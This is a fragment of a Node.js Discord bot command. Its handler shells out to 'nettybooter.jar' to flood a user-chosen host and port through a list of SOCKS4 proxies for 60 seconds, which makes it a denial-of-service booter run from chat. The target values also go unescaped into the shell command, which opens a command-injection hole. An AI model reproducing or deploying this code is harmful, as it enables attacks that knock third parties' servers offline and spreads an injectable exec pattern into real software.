...
module.exports = {
  ...
  run: async ({client, message, args, MessageEmbed}) => {
    ...
    exec(`screen timeout 60 java -Dperdelay=2500 -Ddelay=1 -Drmnwp=false -Dr=false -Dlen=25555 -jar nettybooter.jar ${host}:${port} 7 5 47 60 socks4_proxies.txt socks4`, (error, stdout, stderr) => {
    });
